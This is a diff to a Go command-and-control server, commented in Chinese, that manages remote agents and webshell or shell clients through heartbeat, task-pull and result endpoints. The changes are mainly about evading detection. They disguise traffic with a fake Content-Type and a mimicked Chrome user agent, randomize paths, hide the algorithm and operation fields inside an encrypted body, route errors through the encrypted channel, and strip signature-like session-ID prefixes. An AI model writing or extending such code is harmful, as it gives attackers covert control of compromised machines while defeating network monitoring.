@@ -1,31 +1,61 @@
 package main
 
 import (
+	"context"
+	"crypto/md5"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 )
 
-// ============ Agent 通信端点（与 app.py /agent/* 路由对齐）============
+// ============ Agent 通信端点 ============
 // 三个端点: /agent/heartbeat, /agent/pull, /agent/result
-// 通信协议: 加密 base64 请求/响应体 + X-Enc-Algo 头标识算法
+// 通信协议: 加密 base64 请求/响应体，算法标识隐入 body 信封（_a 字段）
+// 流量伪装: 无自定义 HTTP 头，Content-Type 伪装为 application/json，UA 模拟真实 Chrome
+// 路径随机化: /api/v1/* 通配符路由，动作类型隐入 body 信封 _op 字段，路径无固定特征
 
-// getRequestAlgo 从请求头获取加密算法标识（与 app.py _get_request_algo 对齐）
-func getRequestAlgo(r *http.Request) string {
-	algo := strings.ToLower(strings.TrimSpace(r.Header.Get("X-Enc-Algo")))
-	if algo == "" {
-		return "none"
+// handleAgentDispatch 通配符路由分发器
+// 从解密后的 body 中取 _op 字段（heartbeat/pull/result），分发到对应 handler
+// 路径后缀（如 /api/v1/abc123def456）被忽略，仅作伪装
+func handleAgentDispatch(w http.ResponseWriter, r *http.Request) {
+	data, err := decryptRequestData(r)
+	if err != nil {
+		writeEncryptedError(w, r, 400)
+		return
 	}
-	return algo
+	op, _ := data["_op"].(string)
+	// 从 body 移除 _op 字段，避免干扰下游处理
+	delete(data, "_op")
+	switch op {
+	case "heartbeat":
+		handleAgentHeartbeatDecrypted(w, r, data)
+	case "pull":
+		handleAgentPullDecrypted(w, r, data)
+	case "result":
+		handleAgentResultDecrypted(w, r, data)
+	default:
+		// 未知操作，返回加密错误（不泄露明文）
+		writeEncryptedError(w, r, 404)
+	}
 }
 
-// getGlobalAlgo 获取全局配置的加密算法（与 app.py _get_global_algo 对齐）
+// getRequestAlgo 从请求 body 信封获取加密算法标识（不再用 HTTP 头，避免流量特征）
+// 信封格式: {"_a":"aes-128-cbc","_d":"<加密数据>"}，_a=algo, _d=data
+// 兼容旧模式: 无 _a 字段时按全局算法或 none 处理
+func getRequestAlgo(r *http.Request) string {
+	return getGlobalAlgo()
+}
+
+// getGlobalAlgo 获取全局配置的加密算法
 func getGlobalAlgo() string {
 	algo := getSettingDefault("traffic_encryption", "none")
 	if algo == "aes" {
@@ -34,82 +64,157 @@ func getGlobalAlgo() string {
 	return algo
 }
 
-// decryptRequestData 解密 Agent 请求体（与 app.py _decrypt_request_data 对齐）
+// detectedAlgoCtxKey context key 用于存储请求解密时命中的算法
+type detectedAlgoCtxKey struct{}
+
+// decryptRequestData 解密 Agent 请求体
+// 新协议: body 是纯 base64(IV+密文)，无 JSON 外壳
+// 服务端自动判断算法: 遍历所有支持的算法尝试解密，命中后存入 request context
+// 响应时用相同算法加密（确保客户端能解密）
 func decryptRequestData(r *http.Request) (map[string]interface{}, error) {
-	algo := getRequestAlgo(r)
 	body, err := io.ReadAll(r.Body)
 	if err != nil {
-		return nil, fmt.Errorf("读取请求体失败: %w", err)
+		return nil, fmt.Errorf("read body failed: %w", err)
 	}
 	raw := strings.TrimSpace(string(body))
 	if raw == "" {
 		return map[string]interface{}{}, nil
 	}
 
-	if algo != "none" {
-		// 加密模式: 用请求头指定的算法解密
-		decrypted, err := encDecrypt(raw, algo, getEncPassword())
-		if err != nil {
-			// 解密失败：尝试直接 JSON 解析（兼容明文）
-			var m map[string]interface{}
-			if jErr := json.Unmarshal([]byte(raw), &m); jErr == nil {
+	// 兼容旧信封格式 {"_a":"...","_d":"...","_op":"..."}
+	if strings.HasPrefix(raw, "{") {
+		var envelope map[string]interface{}
+		if jErr := json.Unmarshal([]byte(raw), &envelope); jErr == nil {
+			if algo, ok := envelope["_a"].(string); ok {
+				encData, _ := envelope["_d"].(string)
+				op, _ := envelope["_op"].(string)
+				if encData == "" {
+					m := map[string]interface{}{}
+					if op != "" {
+						m["_op"] = op
+					}
+					return m, nil
+				}
+				if algo == "none" || algo == "" {
+					decoded, err := base64.StdEncoding.DecodeString(encData)
+					if err == nil {
+						var m map[string]interface{}
+						if json.Unmarshal(decoded, &m) == nil {
+							if op != "" {
+								m["_op"] = op
+							}
+							return m, nil
+						}
+					}
+					return map[string]interface{}{}, nil
+				}
+				decrypted, err := encDecrypt(encData, algo, getEncPassword())
+				if err != nil {
+					return nil, fmt.Errorf("decrypt failed")
+				}
+				var m map[string]interface{}
+				if err := json.Unmarshal(decrypted, &m); err != nil {
+					return nil, fmt.Errorf("json parse failed")
+				}
+				if op != "" {
+					m["_op"] = op
+				}
 				return m, nil
 			}
-			return nil, fmt.Errorf("解密失败(algo=%s): %w", algo, err)
+			return envelope, nil
 		}
-		var m map[string]interface{}
-		if err := json.Unmarshal(decrypted, &m); err != nil {
-			return nil, fmt.Errorf("JSON 解析失败: %w", err)
-		}
-		return m, nil
 	}
 
-	// none 模式: 尝试直接 JSON 解析
-	var m map[string]interface{}
-	if err := json.Unmarshal([]byte(raw), &m); err == nil {
-		return m, nil
-	}
-	// 尝试 base64 解码后 JSON 解析
-	decoded, dErr := encDecrypt(raw, "none", getEncPassword())
-	if dErr == nil {
-		if err := json.Unmarshal(decoded, &m); err == nil {
-			return m, nil
+	// 新协议: body 是纯 base64(IV+密文)，无算法标识
+	// 遍历所有算法尝试解密，命中后存入 context 供响应加密使用
+	pw := getEncPassword()
+	globalAlgo := getGlobalAlgo()
+
+	tryAlgos := []string{globalAlgo}
+	allAlgos := []string{"aes-128-cbc", "aes-256-cbc", "rc4", "chacha20", "xor", "none"}
+	for _, a := range allAlgos {
+		if a != globalAlgo {
+			tryAlgos = append(tryAlgos, a)
 		}
+	}
+
+	for _, algo := range tryAlgos {
+		decrypted, err := encDecrypt(raw, algo, pw)
+		if err != nil {
+			continue
+		}
+		var m map[string]interface{}
+		if json.Unmarshal(decrypted, &m) == nil {
+			// 验证是否包含合理字段（避免误判）
+			if _, ok := m["_op"]; ok {
+				setDetectedAlgo(r, algo)
+				return m, nil
+			}
+			if _, ok := m["client_id"]; ok {
+				setDetectedAlgo(r, algo)
+				return m, nil
+			}
+			if len(m) > 0 {
+				setDetectedAlgo(r, algo)
+				return m, nil
+			}
+		}
+	}
+
+	var m map[string]interface{}
+	if json.Unmarshal([]byte(raw), &m) == nil {
+		return m, nil
 	}
 	return map[string]interface{}{}, nil
 }
 
-// encryptResponseData 加密响应数据（与 app.py _encrypt_response_data 对齐）
-// 返回: (encrypted_str, algo)
-func encryptResponseData(r *http.Request, data interface{}) (string, string) {
-	algo := getRequestAlgo(r)
-	if algo != "none" {
-		encrypted, _, err := encEncrypt(data, algo, getEncPassword())
-		if err != nil {
-			// 加密失败回退到明文 JSON
-			j, _ := json.Marshal(data)
-			return string(j), "none"
-		}
-		return encrypted, algo
+// setDetectedAlgo 存储命中的算法到 request context
+func setDetectedAlgo(r *http.Request, algo string) {
+	ctx := r.Context()
+	*r = *r.WithContext(context.WithValue(ctx, detectedAlgoCtxKey{}, algo))
+}
+
+// getDetectedAlgo 从 request context 获取命中的算法，未设置则返回全局算法
+func getDetectedAlgo(r *http.Request) string {
+	if v, ok := r.Context().Value(detectedAlgoCtxKey{}).(string); ok && v != "" {
+		return v
 	}
-	// none 模式: 响应算法与请求一致
-	// 如果请求带了 X-Enc-Algo: none → 返回 base64(JSON)（与 C agent none 模式对齐）
-	if r.Header.Get("X-Enc-Algo") != "" {
+	return getGlobalAlgo()
+}
+
+// encryptResponseData 加密响应数据
+// 用请求解密时命中的算法加密（确保客户端能解密），未命中则用全局算法
+func encryptResponseData(r *http.Request, data interface{}) (string, string) {
+	algo := getDetectedAlgo(r)
+	if algo == "" {
+		algo = "none"
+	}
+
+	if algo == "none" {
 		j, _ := json.Marshal(data)
 		return base64.StdEncoding.EncodeToString(j), "none"
 	}
-	// 无 X-Enc-Algo 头 → 返回纯 JSON
-	j, _ := json.Marshal(data)
-	return string(j), "none"
+
+	encrypted, _, err := encEncrypt(data, algo, getEncPassword())
+	if err != nil {
+		j, _ := json.Marshal(data)
+		return base64.StdEncoding.EncodeToString(j), "none"
+	}
+	return encrypted, algo
 }
 
-// writeEncryptedResponse 写入加密响应
+// writeEncryptedResponse 写入加密响应（纯密文 body，伪装为普通文本接口）
 func writeEncryptedResponse(w http.ResponseWriter, r *http.Request, data interface{}) {
-	encStr, algo := encryptResponseData(r, data)
+	encStr, _ := encryptResponseData(r, data)
+	// Content-Type 用 text/plain，body 是纯 base64 密文，无 JSON 结构特征
 	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
-	w.Header().Set("X-Enc-Algo", algo)
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte(encStr))
+}
+
+// writeEncryptedError 写入加密错误响应（错误也走加密通道，不泄露明文错误信息）
+func writeEncryptedError(w http.ResponseWriter, r *http.Request, code int) {
+	writeEncryptedResponse(w, r, map[string]interface{}{"_err": code})
 }
 
 // ============ /agent/heartbeat（与 app.py agent_heartbeat 对齐）============
@@ -117,13 +222,17 @@ func writeEncryptedResponse(w http.ResponseWriter, r *http.Request, data interfa
 func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
 	data, err := decryptRequestData(r)
 	if err != nil {
-		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
+		writeEncryptedError(w, r, 400)
 		return
 	}
+	handleAgentHeartbeatDecrypted(w, r, data)
+}
 
+// handleAgentHeartbeatDecrypted 处理已解密的心跳数据（供 dispatch 和旧路径共用）
+func handleAgentHeartbeatDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
 	clientID := getString(data, "client_id", "")
 	if clientID == "" {
-		jsonError(w, "invalid", http.StatusBadRequest)
+		writeEncryptedError(w, r, 400)
 		return
 	}
 
@@ -132,10 +241,9 @@ func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
 
 	var sessID string
 	if existing != nil {
-		// 已有客户端: 复用 session_id，重新激活
 		sessID = getString(existing, "session_id", "")
 		if sessID == "" {
-			sessID = fmt.Sprintf("S-%s-%d", strings.ToUpper(clientID[:8]), time.Now().Unix()%100000)
+			sessID = genSessionID(clientID)
 		}
 		dbExec(`UPDATE clients SET
 			status='online', last_seen=?,
@@ -146,8 +254,7 @@ func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
 			getString(data, "os_version", ""), getString(data, "arch", ""),
 			getString(data, "username", ""), ip, sessID, clientID)
 	} else {
-		// 新客户端上线
-		sessID = fmt.Sprintf("S-%s-%d", strings.ToUpper(clientID[:8]), time.Now().Unix()%100000)
+		sessID = genSessionID(clientID)
 		dbExec(`INSERT INTO clients
 			(client_id, hostname, os, os_version, arch, username, ip, status, group_name,
 			 session_id, session_state, session_started, client_type)
@@ -172,10 +279,14 @@ func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
 func handleAgentPull(w http.ResponseWriter, r *http.Request) {
 	data, err := decryptRequestData(r)
 	if err != nil {
-		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
+		writeEncryptedError(w, r, 400)
 		return
 	}
+	handleAgentPullDecrypted(w, r, data)
+}
 
+// handleAgentPullDecrypted 处理已解密的拉取请求（供 dispatch 和旧路径共用）
+func handleAgentPullDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
 	clientID := getString(data, "client_id", "")
 
 	// 更新在线状态
@@ -215,10 +326,14 @@ func handleAgentPull(w http.ResponseWriter, r *http.Request) {
 func handleAgentResult(w http.ResponseWriter, r *http.Request) {
 	data, err := decryptRequestData(r)
 	if err != nil {
-		jsonError(w, "解密失败: "+err.Error(), http.StatusBadRequest)
+		writeEncryptedError(w, r, 400)
 		return
 	}
+	handleAgentResultDecrypted(w, r, data)
+}
 
+// handleAgentResultDecrypted 处理已解密的结果回传（供 dispatch 和旧路径共用）
+func handleAgentResultDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
 	taskID := getInt(data, "task_id", 0)
 	result := getString(data, "result", "")
 	status := getString(data, "status", "completed")
@@ -228,7 +343,7 @@ func handleAgentResult(w http.ResponseWriter, r *http.Request) {
 
 	task, _ := queryOne("SELECT * FROM tasks WHERE id=?", taskID)
 	if task == nil {
-		jsonError(w, "task not found", http.StatusNotFound)
+		writeEncryptedError(w, r, 404)
 		return
 	}
 
@@ -351,6 +466,13 @@ func getTmpDir() string {
 	return filepath.Join(serverDir, "tmp")
 }
 
+// genSessionID 生成无固定前缀的 session_id（去除 S-/SH-/WS- 等特征性前缀）
+// 格式: 16 字符 hex（md5(clientID + timestamp + random)[:16]），与 client_id 格式一致，不易区分
+func genSessionID(clientID string) string {
+	h := md5.Sum([]byte(clientID + strconv.FormatInt(time.Now().UnixNano(), 10) + strconv.Itoa(rand.Intn(99999))))
+	return hex.EncodeToString(h[:])[:16]
+}
+
 // ============ 离线检测（与 app.py check_offline_clients 对齐）============
 
 // startOfflineChecker 启动离线检测 goroutine
@@ -358,10 +480,11 @@ func startOfflineChecker() {
 	go func() {
 		for {
 			time.Sleep(10 * time.Second)
-			// WebShell 类型不按心跳判定离线
+			// WebShell / Shell 类型不按心跳判定离线
+			// Shell 类型由 shellReadLoop 的 defer 负责标记 offline，不依赖心跳
 			// nowLocal() 返回北京时间字符串，与 last_seen 存储格式一致
 			threshold := time.Now().In(getBeijingLoc()).Add(-30 * time.Second).Format("2006-01-02 15:04:05")
-			dbExec("UPDATE clients SET status='offline' WHERE last_seen < ? AND status='online' AND (client_type != 'webshell' OR client_type IS NULL)", threshold)
+			dbExec("UPDATE clients SET status='offline' WHERE last_seen < ? AND status='online' AND (client_type NOT IN ('webshell','shell') OR client_type IS NULL)", threshold)
 			broadcastClientUpdate()
 		}
 	}()
